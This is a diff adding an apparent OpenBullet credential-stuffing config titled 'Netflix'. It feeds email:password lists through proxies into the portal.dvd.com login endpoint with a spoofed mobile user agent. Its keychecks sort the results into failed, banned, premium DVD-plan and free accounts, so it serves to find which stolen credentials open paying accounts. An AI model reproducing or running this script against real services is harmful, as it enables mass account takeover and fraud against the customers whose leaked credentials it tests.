@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "Netflix",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-04T21:11:48.0338976+00:00",
+  "AdditionalInfo": "",
+  "Author": "Choempie",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://portal.dvd.com/auth/login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: okhttp/3.10.0" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Login Failed" 
+  KEYCHAIN Ban OR 
+    KEY "Request Rejected" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "Accountype:Premium & Has DVD" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Login Failed - Streaming customer does not have DVD plan" 
